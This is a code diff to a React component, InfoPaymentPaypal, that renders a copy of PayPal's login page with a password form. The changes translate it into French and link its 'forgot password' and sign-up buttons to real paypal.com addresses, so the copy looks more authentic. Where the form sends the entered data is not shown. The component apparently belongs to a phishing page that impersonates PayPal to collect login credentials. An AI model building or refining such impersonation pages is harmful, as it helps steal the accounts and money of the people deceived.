@@ -12,13 +12,16 @@ function InfoPaymentPaypal() {
         >
           <div class="corral">
             <div id="content" class="contentContainer">
-              <header>
+              <div className="header-paypal">
                 <p class="paypal-logo paypal-logo-long">
                   <center>
-                    <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png" />
+                    <img
+                      src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"
+                      alt="PayPal Logo"
+                    />
                   </center>
                 </p>
-              </header>
+              </div>
               <form
                 action="#"
                 method="post"
@@ -60,7 +63,7 @@ function InfoPaymentPaypal() {
                         required="required"
                         aria-required="true"
                         value=""
-                        placeholder="Password"
+                        placeholder="Mot de passe"
                       />
                     </div>
                   </div>
@@ -73,23 +76,28 @@ function InfoPaymentPaypal() {
                     name="btnLogin"
                     value="Login"
                   >
-                    Log In
+                    Se connecter
                   </button>
                 </div>
                 <div class="forgotLink">
                   <a
-                    href="#"
+                    href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fmyaccount%25252Fsummary%2526state%253D%25253Fcountry.x%25253DFR%252526locale.x%25253Dfr_FR"
                     id="forgotPasswordModal"
                     class="scTrack:unifiedlogin-click-forgot-password"
                   >
-                    Having trouble logging in?
+                    Mot de passe oublié ?
                   </a>
                 </div>
                 <input type="hidden" id="bp_mid" name="bp_mid" value="" />
               </form>
 
-              <a href="#" class="button secondary" id="createAccount">
-                Sign Up
+              <a
+                href="https://www.paypal.com/fr/welcome/signup/#/login_info"
+                target="blank"
+                class="button secondary"
+                id="createAccount"
+              >
+                S'inscrire
               </a>
             </div>
           </div>
